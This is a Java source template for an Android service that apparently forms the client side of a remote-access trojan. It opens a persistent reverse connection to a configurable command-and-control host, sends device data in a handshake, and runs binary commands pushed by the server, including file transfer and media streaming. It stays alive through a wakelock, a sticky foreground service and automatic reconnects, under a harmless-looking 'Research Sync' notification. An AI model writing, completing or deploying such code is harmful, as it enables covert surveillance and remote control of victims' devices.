package {{PACKAGE}};

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.pm.ServiceInfo;
import android.os.Build;
import android.os.IBinder;
import android.os.PowerManager;
import android.provider.Settings;
import android.util.Log;

import org.json.JSONObject;

import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.net.InetSocketAddress;
import java.net.Socket;
import java.nio.ByteBuffer;
import java.nio.ByteOrder;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

/**
 * Elite Reverse Connection Service v3.0
 * ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 * • Full binary protocol support (BinaryCmdType 0x01–0x51)
 * • EliteHandshakeData — maps to every EliteDB column (shadow.db)
 * • BinaryCommandExecutor — dispatches all commands server-side
 * • Auto-reconnect with exponential back-off (5 s → 60 s)
 * • Heartbeat every 30 s  •  WakeLock  •  ForegroundService
 *
 * Wire format (matches EliteServerManager.cs / BinaryCommandExecutor.template):
 *   [MAGIC:1=0xB1][VERSION:1][TYPE:1][LEN:4 LE][PAYLOAD:N]
 */
public class ReverseConnectionService extends Service {

    private static final String TAG        = "EliteCore";
    private static final String CHANNEL_ID = "elite_research_sync";

    // ─── Protocol constants ────────────────────────────────────────────────
    static final byte MAGIC            = (byte) 0xB1;
    static final byte VERSION          = 0x01;

    // Server → Client command types (incoming)
    static final byte TYPE_HEARTBEAT   = 0x01;
    static final byte TYPE_BINARY_CMD  = 0x05; // BinaryCmdType payload follows

    // Client → Server result types (outgoing)
    static final byte TYPE_HANDSHAKE   = 0x02;
    static final byte TYPE_RESULT      = 0x30;
    static final byte TYPE_FILE        = 0x02; // file transfer
    static final byte TYPE_STREAM      = 0x40; // media stream chunk
    static final byte TYPE_PONG        = 0x01; // heartbeat reply

    // ─── Connection settings (injected by build_pro.bat) ──────────────────
    private static String  C2_HOST = "{{CONNECTION_HOST}}";
    private static int     C2_PORT = {{CONNECTION_PORT}};
    private static String  C2_KEY  = "{{CONNECTION_KEY}}";

    // ─── Runtime state ─────────────────────────────────────────────────────
    private Socket            socket;
    private DataInputStream   input;
    private DataOutputStream  output;
    private PowerManager.WakeLock wakeLock;
    private ExecutorService   executor;
    private BinaryCommandExecutor cmdExecutor;
    private volatile boolean  isConnected     = false;
    private volatile boolean  shouldReconnect = true;
    private int               reconnectDelay  = 5_000; // ms

    // ══════════════════════════════════════════════════════════════════════
    //  Service lifecycle
    // ══════════════════════════════════════════════════════════════════════
    @Override
    public void onCreate() {
        super.onCreate();
        executor   = Executors.newCachedThreadPool();
        PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
        if (pm != null) {
            wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, TAG + "::WL");
            wakeLock.acquire(10L * 60 * 60 * 1000); // 10 h max
        }
        createNotificationChannel();
        startForegroundCompat();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (intent != null) {
            String h = intent.getStringExtra("HOST");
            int    p = intent.getIntExtra("PORT", 0);
            String k = intent.getStringExtra("KEY");
            if (h != null && !h.isEmpty()) C2_HOST = h;
            if (p > 0)                     C2_PORT = p;
            if (k != null && !k.isEmpty()) C2_KEY  = k;
        }
        if (!isConnected && shouldReconnect) executor.execute(this::connectLoop);
        return START_STICKY;
    }

    @Override
    public void onDestroy() {
        shouldReconnect = false;
        cleanup();
        if (wakeLock != null && wakeLock.isHeld()) wakeLock.release();
        executor.shutdownNow();
        super.onDestroy();
    }

    @Override
    public IBinder onBind(Intent intent) { return null; }

    // ══════════════════════════════════════════════════════════════════════
    //  Connection loop with exponential back-off
    // ══════════════════════════════════════════════════════════════════════
    private void connectLoop() {
        while (shouldReconnect) {
            try {
                Log.d(TAG, "Connecting → " + C2_HOST + ":" + C2_PORT);
                socket = new Socket();
                socket.connect(new InetSocketAddress(C2_HOST, C2_PORT), 15_000);
                socket.setKeepAlive(true);
                socket.setTcpNoDelay(true);
                socket.setReceiveBufferSize(81920);
                socket.setSendBufferSize(81920);

                input  = new DataInputStream(socket.getInputStream());
                output = new DataOutputStream(socket.getOutputStream());

                // Wire the command executor to this connection's output stream
                cmdExecutor = new BinaryCommandExecutor(this, output, executor);

                isConnected    = true;
                reconnectDelay = 5_000;

                sendHandshake();
                updateNotification("Research Core: Online ✅");
                Log.d(TAG, "Handshake sent, starting receive loop");

                receiveLoop(); // blocks until disconnect

            } catch (Exception e) {
                Log.e(TAG, "Connection failed: " + e.getMessage());
            } finally {
                isConnected = false;
                cleanup();
                updateNotification("Research Core: Reconnecting…");
                sleepSafe(reconnectDelay);
                reconnectDelay = Math.min(reconnectDelay * 2, 60_000);
            }
        }
    }

    // ══════════════════════════════════════════════════════════════════════
    //  Handshake — sends every EliteDB field to the server
    // ══════════════════════════════════════════════════════════════════════
    private void sendHandshake() throws Exception {
        EliteHandshakeData data = EliteHandshakeData.collect(this);
        data.connectionKey = C2_KEY;
        data.sourcePort    = C2_PORT;

        sendPacket(TYPE_HANDSHAKE, data.toJSON().toString().getBytes("UTF-8"));
        Log.d(TAG, "Handshake: " + data.deviceName + " [" + data.batteryLevel + "]");
    }

    // ══════════════════════════════════════════════════════════════════════
    //  Main receive loop — parses binary frames from the server
    // ══════════════════════════════════════════════════════════════════════
    private void receiveLoop() {
        // Heartbeat sender (every 30 s)
        executor.execute(() -> {
            while (isConnected) {
                try {
                    sendPacket(TYPE_PONG, new byte[0]);
                    Thread.sleep(30_000);
                } catch (Exception ignored) {}
            }
        });

        // Frame reader
        try {
            while (isConnected && socket != null && !socket.isClosed()) {
                // ── Read frame header (7 bytes) ────────────────────────────
                byte magic   = input.readByte();
                if (magic != MAGIC) {
                    Log.w(TAG, "Bad magic: 0x" + String.format("%02X", magic));
                    break;
                }
                byte version = input.readByte();
                byte type    = input.readByte();

                byte[] lenBuf = new byte[4];
                input.readFully(lenBuf);
                int length = ByteBuffer.wrap(lenBuf).order(ByteOrder.LITTLE_ENDIAN).getInt();

                if (length < 0 || length > 64 * 1024 * 1024) { // 64 MB guard
                    Log.e(TAG, "Invalid length: " + length);
                    break;
                }

                // ── Read payload ───────────────────────────────────────────
                byte[] payload = new byte[length];
                if (length > 0) input.readFully(payload);

                // ── Dispatch ───────────────────────────────────────────────
                handleFrame(type, payload);
            }
        } catch (Exception e) {
            Log.e(TAG, "Receive loop ended: " + e.getMessage());
        } finally {
            isConnected = false;
        }
    }

    // ══════════════════════════════════════════════════════════════════════
    //  Frame dispatcher
    // ══════════════════════════════════════════════════════════════════════
    private void handleFrame(byte type, byte[] payload) {
        try {
            switch (type) {

                case TYPE_HEARTBEAT:
                    // Reply with PONG immediately
                    sendPacket(TYPE_PONG, new byte[0]);
                    break;

                case TYPE_BINARY_CMD:
                    // Frame sub-format: [CMD_TYPE:1][CMD_PAYLOAD:N]
                    if (payload.length >= 1) {
                        byte cmdType = payload[0];
                        byte[] cmdPayload = new byte[payload.length - 1];
                        System.arraycopy(payload, 1, cmdPayload, 0, cmdPayload.length);

                        Log.d(TAG, "BinaryCmd: 0x" + String.format("%02X", cmdType)
                                + " payload=" + cmdPayload.length + "b");

                        // Delegate to BinaryCommandExecutor
                        if (cmdExecutor != null) {
                            final byte ct = cmdType;
                            final byte[] cp = cmdPayload;
                            executor.execute(() -> cmdExecutor.dispatch(ct, cp));
                        }
                    }
                    break;

                default:
                    // Unknown frame — log and ignore
                    Log.w(TAG, "Unknown frame type: 0x" + String.format("%02X", type)
                            + " len=" + payload.length);
                    break;
            }
        } catch (Exception e) {
            Log.e(TAG, "Frame dispatch error: " + e.getMessage());
        }
    }

    // ══════════════════════════════════════════════════════════════════════
    //  Send a binary packet (thread-safe)
    // ══════════════════════════════════════════════════════════════════════
    synchronized void sendPacket(byte type, byte[] payload) throws Exception {
        if (output == null || !isConnected) return;
        ByteBuffer header = ByteBuffer.allocate(7).order(ByteOrder.LITTLE_ENDIAN);
        header.put(MAGIC);
        header.put(VERSION);
        header.put(type);
        header.putInt(payload != null ? payload.length : 0);
        output.write(header.array());
        if (payload != null && payload.length > 0) output.write(payload);
        output.flush();
    }

    // ══════════════════════════════════════════════════════════════════════
    //  Helpers
    // ══════════════════════════════════════════════════════════════════════
    private void cleanup() {
        try { if (socket != null) socket.close(); } catch (Exception ignored) {}
        socket = null; input = null; output = null; cmdExecutor = null;
        isConnected = false;
    }

    private void sleepSafe(long ms) {
        try { Thread.sleep(ms); } catch (Exception ignored) {}
    }

    // ── Notification helpers ───────────────────────────────────────────────
    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel ch = new NotificationChannel(
                CHANNEL_ID, "Research Sync", NotificationManager.IMPORTANCE_LOW
            );
            ch.setDescription("Elite Research Core background sync");
            ((NotificationManager) getSystemService(NOTIFICATION_SERVICE)).createNotificationChannel(ch);
        }
    }

    private void startForegroundCompat() {
        Notification n = buildNotification("Initializing…");
        if (Build.VERSION.SDK_INT >= 34) {
            startForeground(1, n, ServiceInfo.FOREGROUND_SERVICE_TYPE_SPECIAL_USE);
        } else {
            startForeground(1, n);
        }
    }

    private void updateNotification(String text) {
        NotificationManager nm = (NotificationManager) getSystemService(NOTIFICATION_SERVICE);
        if (nm != null) nm.notify(1, buildNotification(text));
    }

    private Notification buildNotification(String text) {
        PendingIntent pi = PendingIntent.getActivity(
            this, 0,
            new Intent(this, MainActivity.class),
            Build.VERSION.SDK_INT >= 23
                ? PendingIntent.FLAG_IMMUTABLE : PendingIntent.FLAG_UPDATE_CURRENT
        );
        Notification.Builder b = Build.VERSION.SDK_INT >= Build.VERSION_CODES.O
            ? new Notification.Builder(this, CHANNEL_ID)
            : new Notification.Builder(this);
        return b.setContentTitle("{{APP_NAME}}")
                .setContentText(text)
                .setSmallIcon(android.R.drawable.ic_popup_sync)
                .setContentIntent(pi)
                .setOngoing(true)
                .build();
    }
}
